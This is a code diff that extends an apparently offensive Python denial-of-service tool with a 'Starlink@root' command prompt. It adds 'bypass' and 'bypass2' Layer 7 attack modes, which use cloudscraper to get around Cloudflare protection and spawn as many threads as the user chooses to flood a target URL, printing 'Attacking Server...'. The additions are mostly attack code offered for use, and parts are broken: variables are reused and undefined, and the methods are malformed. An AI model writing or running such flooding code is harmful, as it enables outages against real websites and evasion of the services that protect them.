@@ -40,7 +40,7 @@ def help():
         os.system('clear')
     elif os.name == 'nt':
         os.system('cls')   
-    print("Layer 7 : pps, cfb, http, sky, deaddos")
+    print("Layer 7 : pps, cfb, http, sky, deaddos, bypass, bypass2")
     print("Layer 4 : udp, tcp \nType 'back' to the main page\n\n")    
 def heads(url):
     header = {
@@ -276,6 +276,52 @@ def deadly():
         threadsi = input("Thread ==> ")
         t = input("Time ==> ")
         startdeaddos(url, threadsi, t)
+class BypassAll():
+    scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
+    def process(url, threadsi, t):
+        zzz = int(0)
+        while zzz <= int(threadsi):
+            try:
+                t = threading.Thread(target=startbypass, args=(url, scraper, t))
+                t.start()
+                zzz += 1
+            except:
+                pass
+    def startbypass(url, scraper, t):
+        while int(t) > 0:
+            try:
+                scraper.get(url)
+                requests.get(url, headers=heads, data=data, verify=False)
+                print("Attacking Server...")
+            except:
+                pass
+    def bypass2(url, threadsi, t):
+        scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
+        aa = int(0)
+        while aa <= int(threadsi):
+            try:
+                t = threading.Thread(target=bypazz2, args=(url, scraper, t))
+                t.start()
+                aa += 1
+            except:
+                pass
+    def bypazz2(url, scraper, t):
+        data = {
+          "X": "xXxxX",
+          "Y": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "Z": "ZzzzZzzzzZzzzZzZZzZzzZzzZZZzzZ",
+          "1": "111111111111111111111111111111"
+        }
+        def send_buffer(url):
+            header = heads2()
+            requests.get(url, verify=False, timeout=15, headers=header, data=data)
+            scraper.get(url, verify=False, timeout=15, headers=header, data=data)
+        while int(t) > 0:
+            try:
+                t = threading.Thread(target=send_buffer, args=(url))
+                t.start()
+            except:
+                pass   
 if __name__ == '__main__':
     main()
     a = input(f"{bl}Starlink{wt}@{bl}root{wt}~$ ")
@@ -295,6 +341,16 @@ if __name__ == '__main__':
             tcp()
         elif a.lower() == 'deaddos':
             deadly()
+        elif a.lower() == 'bypass':
+            url = input("Target Url ==> ")
+            threadsi = input("Threads ==> ")
+            t = input("Time ==> ")
+            BypassAll.process(url, threadsi, t)
+        elif a.lower() == 'bypass2':
+            url = input("Target Url ==> ")
+            threadsi = input("Threads ==> ")
+            t = input("Time ==> ")
+            BypassAll.bypass2(url, threadsi, t)    
         elif a.lower() == 'exit':
             exit()    
         elif a.lower() == 'help':
